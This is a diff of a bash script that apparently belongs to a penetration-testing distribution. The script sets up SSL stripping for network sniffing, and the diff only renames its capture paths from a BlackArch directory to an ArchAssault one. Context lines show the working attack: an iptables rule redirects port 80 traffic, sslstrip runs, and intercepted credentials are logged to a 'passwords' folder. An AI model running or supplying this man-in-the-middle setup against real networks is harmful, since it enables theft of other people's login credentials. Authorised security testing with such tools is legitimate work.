@@ -1,7 +1,7 @@
 #!/bin/bash
 #SSLstripp script for sniffing on available interfaces
-if [ ! -d "/opt/blackarch/captures/passwords/" ]; then
-  mkdir -p /opt/blackarch/captures/passwords/
+if [ ! -d "/opt/archassault/captures/passwords/" ]; then
+  mkdir -p /opt/archassault/captures/passwords/
 fi
 ##################################################
 f_interface(){
@@ -75,18 +75,18 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
 clear
 echo
-echo  "Logging to /opt/blackarch/captures/passwords/"
+echo  "Logging to /opt/archassault/captures/passwords/"
 echo
 sleep 2
 
 #DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"
 
 sslstripfilename=sslstrip$(date +%F-%H%M).log
-sslstrip -pfk -w /opt/blackarch/captures/passwords/$sslstripfilename  -l 8888 $interface &
+sslstrip -pfk -w /opt/archassault/captures/passwords/$sslstripfilename  -l 8888 $interface &
 
 sleep 3
 echo
 echo
-tail -f /opt/blackarch/captures/passwords/$sslstripfilename
+tail -f /opt/archassault/captures/passwords/$sslstripfilename
 
 
